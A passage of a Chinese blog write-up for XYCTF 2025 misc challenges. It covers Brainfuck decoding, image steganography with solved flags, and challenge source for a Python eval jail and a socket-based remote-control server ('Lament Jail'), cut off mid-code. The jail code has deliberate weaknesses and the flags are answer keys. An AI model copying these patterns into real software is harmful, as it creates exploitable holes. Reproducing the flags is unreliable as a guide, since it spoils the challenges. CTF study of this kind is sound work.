class="line">&gt;+++++++++++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]</span><br></pre></td></tr></table></figure><p><code>brainfuck</code>，但很遗憾解不出来，没关系交给<code>AI</code>，很高兴<code>AI</code>利用它强大的分析能力，分析出<code>flag</code>的形式了，即<code>&gt;</code>到<code>[</code>之间的<strong>加号数量</strong>乘上<code>&lt;&gt;</code>之间的<strong>加号数量</strong>就是<code>flag</code>的<strong>ASCII值</strong>(本质原理确实如此)，还是要拷打它要个脚本，因为统计的太拉了。。。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_bf_string</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().strip()</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="comment"># 查找第一个 &quot;&gt;&quot; 字符</span></span><br><span class="line">        idx_gt = data.find(<span class="string">&quot;&gt;&quot;</span>, pos)</span><br><span class="line">        <span class="keyword">if</span> idx_gt == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 &quot;&gt;&quot; 后计数连续的 &quot;+&quot;</span></span><br><span class="line">        idx = idx_gt + <span class="number">1</span></span><br><span class="line">        count_out = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[idx] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            count_out += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 若没有遇到 &quot;[&quot;，则说明解析结束</span></span><br><span class="line">        <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(data) <span class="keyword">or</span> data[idx] != <span class="string">&quot;[&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 &quot;[&quot; 后查找第一个 &quot;&lt;&quot;</span></span><br><span class="line">        idx_bracket = data.find(<span class="string">&quot;&lt;&quot;</span>, idx)</span><br><span class="line">        <span class="keyword">if</span> idx_bracket == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 &quot;&lt;&quot; 后计数连续的 &quot;+&quot;</span></span><br><span class="line">        idx = idx_bracket + <span class="number">1</span></span><br><span class="line">        count_in = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[idx] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            count_in += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 若没有遇到 &quot;&gt;&quot; 则跳出</span></span><br><span class="line">        <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(data) <span class="keyword">or</span> data[idx] != <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算乘积并转换为字符</span></span><br><span class="line">        product = count_out * count_in</span><br><span class="line">        result += <span class="built_in">chr</span>(product)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新 pos 到刚刚匹配完的 &quot;&gt;&quot; 之后，继续下一段</span></span><br><span class="line">        pos = idx + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    filename = <span class="string">&quot;C:\\Users\\27920\\Desktop\\bf.txt&quot;</span></span><br><span class="line">    decoded = decode_bf_string(filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密结果:&quot;</span>, decoded)</span><br></pre></td></tr></table></figure><p><code>flag&#123;W3lC0me_t0_XYCTF_2025_Enj07_1t!&#125;</code></p><p>题目这里只是缺乏输出，我们只需要使用<code>.</code>即可(难道你没发现少了这个东西吗)<br>全部的<code>&lt;[</code>替换为<code>&lt;.[</code>即可</p><h2 id="曼波曼波曼波"><a href="#曼波曼波曼波" class="headerlink" title="曼波曼波曼波"></a>曼波曼波曼波</h2><p>给了一张假<code>flag</code>的二维码，然后<code>smn.txt</code>很明显是<strong>倒序的base64</strong>，把图像下载下来发现<strong>jpg图片尾</strong>有<strong>压缩包</strong>，导出，压缩包密码盲猜<code>XYCTF2025</code>，然后得到两张<strong>看似一样</strong>的照片，直接上<strong>双图盲水印</strong><br><img src="https://pica.zhimg.com/80/v2-b467d0602066750608d0c1fbdc382e36_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-202a1c786a9ac0b51a77671bcd5aa5cc_1440w.png" alt=""><br><code>XYCTF&#123;easy_yin_xie_dfbfuj877&#125;</code></p><h2 id="MADer也要当CTFer"><a href="#MADer也要当CTFer" class="headerlink" title="MADer也要当CTFer*"></a>MADer也要当CTFer*</h2><blockquote><p>你知道PRTShark是什么意思吗，P是位置，R是旋转，T是不透明度，S是缩放，而hark代表这道题是hard to hack吧</p></blockquote><p>蚝康，这题需要使用到<code>AE</code>，一款图形视频处理软件，那还是蹲个<code>wp</code>观摩一下吧</p><h2 id="会飞的雷克萨斯"><a href="#会飞的雷克萨斯" class="headerlink" title="会飞的雷克萨斯*"></a>会飞的雷克萨斯*</h2><blockquote><p>2025年1月30日W1ndys上网冲浪时，收到了舍友发来的聊天记录，聊天记录显示，一小孩放鞭炮引爆地面，请定位爆炸点的具体位置，该题解出需要通过正常的osint题目做题思路</p></blockquote><p>好，是社工，笑死，不玩(狗头)</p><h2 id="Greedymen"><a href="#Greedymen" class="headerlink" title="Greedymen*"></a>Greedymen*</h2><blockquote><p>Isn’t it ironic? Greed isn’t limited. Freedom is a limited resource.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">nc <span class="number">8.147</span><span class="number">.132</span><span class="number">.32</span> <span class="number">17479</span></span><br><span class="line">Welcome to the Greedy Game</span><br><span class="line">Your goal <span class="keyword">is</span> to be <span class="keyword">as</span> greedy <span class="keyword">as</span> possible</span><br><span class="line"><span class="number">1.</span>Play</span><br><span class="line"><span class="number">2.</span>Rules</span><br><span class="line"><span class="number">3.</span>Quit</span><br><span class="line"><span class="number">2</span></span><br><span class="line">There are <span class="number">3</span> levels, level <span class="number">1</span>/<span class="number">2</span>/<span class="number">3</span> has number <span class="number">1</span> to <span class="number">50</span>/<span class="number">100</span>/<span class="number">200</span> on board to choose <span class="keyword">from</span></span><br><span class="line">Each number you choose, you get the corresponding points</span><br><span class="line">However, your opponent will choose <span class="built_in">all</span> the factors of the number you choose, <span class="keyword">and</span> get the points of each factor</span><br><span class="line">You can <span class="keyword">not</span> choose numbers that are already assigned to a player</span><br><span class="line">You are only allow to choose the number <span class="keyword">if</span> it has at least one factor <span class="keyword">not</span> choosen</span><br><span class="line">If you can<span class="string">&#x27;t choose anymore, the rest of the board goes to your opponent</span></span><br><span class="line"><span class="string">To make the challenge harder, there is a counter that starts with 19/37/76 in level 1/2/3, each time you choose a number, the counter decreases by 1</span></span><br><span class="line"><span class="string">When it reaches 0, and the game will end, and the unassigned numbers will go to your opponent</span></span><br><span class="line"><span class="string">The challenge is always solvable</span></span><br><span class="line"><span class="string">Player with highest score wins</span></span><br><span class="line"><span class="string">Good Luck!</span></span><br><span class="line"><span class="string">1.Play</span></span><br><span class="line"><span class="string">2.Rules</span></span><br><span class="line"><span class="string">3.Quit</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Level 1/3 50 Numbers</span></span><br><span class="line"><span class="string">Unassigned Numbers: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]</span></span><br><span class="line"><span class="string">Counter: 19</span></span><br><span class="line"><span class="string">Your Score: 0</span></span><br><span class="line"><span class="string">Opponent Score: 0</span></span><br><span class="line"><span class="string">Choose a Number:49</span></span><br><span class="line"><span class="string">Unassigned Numbers: [2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50]</span></span><br><span class="line"><span class="string">Counter: 18</span></span><br><span class="line"><span class="string">Your Score: 49</span></span><br><span class="line"><span class="string">Opponent Score: 8</span></span><br><span class="line"><span class="string">Choose a Number:</span></span><br></pre></td></tr></table></figure><p>肥肠好玩的一个游戏</p><h2 id="sins"><a href="#sins" class="headerlink" title="sins*"></a>sins*</h2><blockquote><p>“Come now, let us settle the matter,” says the LORD. “Though your sins are like scarlet, they shall be as white as snow; though they are red as crimson, they shall be like wool. - Isaiah 1:18</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;For there are three that bear record in heaven, the Father, the Word, and the Holy Ghost&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;But here we have four cases bearing witness&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i_pow</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">4</span> == <span class="number">0</span>: <span class="comment"># as the 40 days of flood</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">1</span>: <span class="comment"># as the 1 true God</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">2</span>: <span class="comment"># as the 2 tablets of stone</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">3</span>: <span class="comment"># as the 3 days in the tomb</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-i&#x27;</span></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&quot;wash away your sins: &quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> <span class="string">&quot;i0123456789+-*%/^=&lt;&gt;~&amp;|:()[]&#x27;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> inp), <span class="string">&quot;invalid char&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(inp) &lt; <span class="number">16</span>, <span class="string">&quot;too long&quot;</span></span><br><span class="line">R = <span class="built_in">eval</span>(<span class="string">f&quot;lambda i: <span class="subst">&#123;inp&#125;</span>&quot;</span>, &#123;&#125;, &#123;&#125;)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(R(i) == i_pow(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>.from_bytes(<span class="string">b&#x27;The_adwa_shall_forgive_thee&#x27;</span>) // <span class="number">2</span>**<span class="number">195</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="Lament-Jail"><a href="#Lament-Jail" class="headerlink" title="Lament Jail*"></a>Lament Jail*</h2><blockquote><p>异想体编号：H-██████ ；异想体名称：flag；安全等级：优；状态：该异想体已突破收容。描述：该异想体本质上为一段”flag{“开头”}”结尾的字符串。它极度胆怯，害怕人类不同等级的观察。该异想体经常突破收容。他的内容是██████████████████████████；收容条件：flag被收容在一个对公网开放的主机（flag-1，又名Lament Jail）上的/flag文件里。该主机上运行有能够让人们完全控制主机的服务（使用套接字进行远控），便于观测异想体状态；事件经过：事件编号████████████████。████年██月███日，由于工作人员██████████████的失误，flag被赋予高权限。它成功突破了收容。flag目前被观测到改写了人们控制它的服务。在这之上做了一些加密措施，并限制了远程代码的执行。这使得我们极难观测该异想体。同时，它摆脱了文件/flag的限制，逃到了█████████████。所幸，我们在主机上留下了/bin/rf，它可以直接从███████████████读取flag。同时，员工█████████████通过某种手段取回了正在运行的服务的源码。请你连接并突破该异想体在Lament Jail上做的限制，控制这台主机，找回flag。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @FileName  :Lament_Jail.py</span></span><br><span class="line"><span class="comment"># @Time      :2025/3/22 12:37:43</span></span><br><span class="line"><span class="comment"># @Author    :LamentXU</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> remove</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> compress, decompress</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Definate all the errors</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageLengthError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PasswordError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.message = message</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleTCP</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    The main class when using TCP</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, family: AddressFamily = AF_INET, <span class="built_in">type</span>: SocketKind = SOCK_STREAM</span></span><br><span class="line"><span class="params">                 , proto: <span class="built_in">int</span> = -<span class="number">1</span>, fileno: <span class="built_in">int</span> = <span class="literal">None</span>, is_encrypted: <span class="built_in">bool</span> = <span class="literal">True</span>, AES_key: <span class="built_in">bytes</span> = <span class="literal">None</span>, password: <span class="built_in">bytes</span> = <span class="literal">None</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        is_encrypted: use encrypted connection, only for server</span></span><br><span class="line"><span class="string">        AES_key: use a fixed AES_key, None for random, must be 16 bytes, only for server</span></span><br><span class="line"><span class="string">        password: A fixed password is acquired from the client (must smaller than be 100 bytes), if wrong, the connection will be closed</span></span><br><span class="line"><span class="string">            if password is set in server, every time a client connect, the client must send the same password back to the server to accept.</span></span><br><span class="line"><span class="string">            if password is set in client, every time you connect to the server, the password will be sent to the server to verify.</span></span><br><span class="line"><span class="string">            if password is None, no password will be used.</span></span><br><span class="line"><span class="string">        self.Default_message_len: if in encrypted mode, the value must be a multiple of self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        MAKE SURE THE DEFAULT_MESSAGE_LEN OF BOTH SERVER AND CLIENT ARE SAME, Or it could be a hassle</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        self.BLOCK_SIZE = <span class="number">16</span> <span class="comment"># block size of padding text which will be encrypted by AES</span></span><br><span class="line">        <span class="comment"># the block size must be a mutiple of 8</span></span><br><span class="line">        self.default_encoder = <span class="string">&#x27;utf8&#x27;</span>  <span class="comment"># the default encoder used in send and recv when the message is not bytes</span></span><br><span class="line">        <span class="keyword">if</span> is_encrypted:</span><br><span class="line">            <span class="keyword">if</span> AES_key == <span class="literal">None</span>:</span><br><span class="line">                self.key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># generate 16 bytes AES code</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.key = AES_key <span class="comment">#TODO check the input </span></span><br><span class="line">            self.cipher_aes = AES.new(self.key, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.key, self.cipher_aes = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">        self.default_message_len = <span class="number">1024</span> <span class="comment"># length of some basic message, it&#x27;s best not to go below 1024 bytes</span></span><br><span class="line">        <span class="keyword">if</span> password == <span class="literal">None</span>:</span><br><span class="line">            self.password = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.password = self.turn_to_bytes(password)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(password) &gt; <span class="number">100</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;The password is too long, it must be smaller than 100 bytes&#x27;</span>)</span><br><span class="line">        self.s = socket(family, <span class="built_in">type</span>, proto, fileno)  <span class="comment"># main socket</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">accept</span>(<span class="params">self</span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Accept with information exchange and key exchange, return the address of the client</span></span><br><span class="line"><span class="string">        if the password from client is wrong or not set, raise PasswordError</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.s, address = self.s.accept()</span><br><span class="line">        <span class="keyword">if</span> self.key == <span class="literal">None</span>:</span><br><span class="line">            is_encrypted = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_encrypted = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> self.password == <span class="literal">None</span>:</span><br><span class="line">            has_password = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            has_password = <span class="literal">True</span></span><br><span class="line">        info_dict = &#123;</span><br><span class="line">            <span class="string">&#x27;is_encrypted&#x27;</span> : is_encrypted,</span><br><span class="line">            <span class="string">&#x27;has_password&#x27;</span> : has_password&#125;</span><br><span class="line">        info_dict = dumps(info_dict).encode(encoding=self.default_encoder)</span><br><span class="line">        self.s.send(self.turn_to_bytes(<span class="built_in">len</span>(info_dict)))</span><br><span class="line">        self.s.send(info_dict)</span><br><span class="line">        <span class="keyword">if</span> has_password:</span><br><span class="line">            password_length = self.unpadding_packets(self.s.recv(<span class="number">3</span>), -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> password_length:</span><br><span class="line">                self.s.close()</span><br><span class="line">                <span class="keyword">raise</span> PasswordError(<span class="string">f&#x27;The client <span class="subst">&#123;address&#125;</span> does not send the password, the connection will be closed&#x27;</span>)</span><br><span class="line">            recv_password = self.s.recv(<span class="built_in">int</span>(password_length.decode(encoding=self.default_encoder))) <span class="comment"># the first byte is whether the password is aquired(1) or not(0), the rest is the password, the password is padded to 100 bytes</span></span><br><span class="line">            <span class="keyword">if</span> recv_password != self.password <span class="keyword">or</span> recv_password[<span class="number">0</span>] == <span class="string">b&#x27;0&#x27;</span>:</span><br><span class="line">                self.s.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">                self.s.close()</span><br><span class="line">                <span class="keyword">raise</span> PasswordError(<span class="string">f&#x27;The password <span class="subst">&#123;recv_password&#125;</span> is wrong, the connection from <span class="subst">&#123;address&#125;</span> will be closed, you can restart the accept() function or put it in a while loop to keep accepting&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.s.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> is_encrypted:</span><br><span class="line">            public_key = self.s.recv(<span class="number">450</span>)</span><br><span class="line">            rsa_public_key = RSA.import_key(public_key)</span><br><span class="line">            cipher_rsa = PKCS1_OAEP.new(rsa_public_key)</span><br><span class="line">            encrypted_aes_key = cipher_rsa.encrypt(self.key)</span><br><span class="line">            self.s.send(encrypted_aes_key)</span><br><span class="line">        <span class="comment"># TODO</span></span><br><span class="line">        <span class="keyword">return</span> address</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">turn_to_bytes</span>(<span class="params">self, message</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Turn str, int, etc. to bytes using &#123;self.default_encoder&#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        type_of_message = <span class="built_in">type</span>(message)</span><br><span class="line">        <span class="keyword">if</span> type_of_message == <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                message = message.encode(encoding=self.default_encoder)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(</span><br><span class="line">                    <span class="string">&#x27;Unexpected type &quot;&#123;&#125;&quot; of &#123;&#125; when encode it with &#123;&#125;, raw traceback: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(type_of_message, message, self.default_encoder, e))</span><br><span class="line">        <span class="keyword">elif</span> type_of_message == <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                message = <span class="built_in">str</span>(message).encode(encoding=self.default_encoder)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(</span><br><span class="line">                    <span class="string">&#x27;Unexpected type &quot;&#123;&#125;&quot; of &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(type_of_message, message))</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpadding_packets</span>(<span class="params">self, data: <span class="built_in">bytes</span>, pad_num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Delete the blank bytes at the back of the message</span></span><br><span class="line"><span class="string">        pad_num : number of the blank bytes</span></span><br><span class="line"><span class="string">        pad_num = -1, delete all the blank bytes the the back(or use .rstrip() directly is ok)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> pad_num == -<span class="number">1</span>:</span><br><span class="line">            data = data.rstrip()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> pad_num &gt; <span class="number">0</span> <span class="keyword">and</span> data[-<span class="number">1</span>:] == <span class="string">b&#x27; &#x27;</span>:</span><br><span class="line">                data = data[:-<span class="number">1</span>]</span><br><span class="line">                pad_num -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">padding_packets</span>(<span class="params">self, message: <span class="built_in">bytes</span>, target_length: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad the packet to &#123;target_length&#125; bytes with b&#x27; &#x27;, used in not-encrypted mode</span></span><br><span class="line"><span class="string">        The packet must be smaller then &#123;target_length&#125;</span></span><br><span class="line"><span class="string">        target_length = None : use self.default_message_len</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        <span class="keyword">if</span> target_length == <span class="literal">None</span>:</span><br><span class="line">            target_length = self.default_message_len</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(message) &gt; target_length:</span><br><span class="line">            <span class="keyword">raise</span> MessageLengthError(</span><br><span class="line">                <span class="string">&#x27;the length &#123;&#125; bytes of the message is bigger than &#123;&#125; bytes, please use self.send_large_small and self.recv instead&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)), target_length))</span><br><span class="line">        pad_num = target_length-<span class="built_in">len</span>(message)</span><br><span class="line">        message += <span class="string">b&#x27; &#x27;</span> * pad_num</span><br><span class="line">        <span class="keyword">return</span> (message, pad_num)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad_packets_to_mutiple</span>(<span class="params">self, data: <span class="built_in">bytes</span>, block_size: <span class="built_in">int</span> == <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode</span></span><br><span class="line"><span class="string">        target_length = None : use self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        padding_length = block_size - (<span class="built_in">len</span>(data) % block_size)</span><br><span class="line">        <span class="keyword">if</span> padding_length == <span class="number">0</span>:</span><br><span class="line">            padding_length = block_size</span><br><span class="line">        padding = <span class="built_in">bytes</span>([padding_length]) * padding_length</span><br><span class="line">        padded_data = data + padding</span><br><span 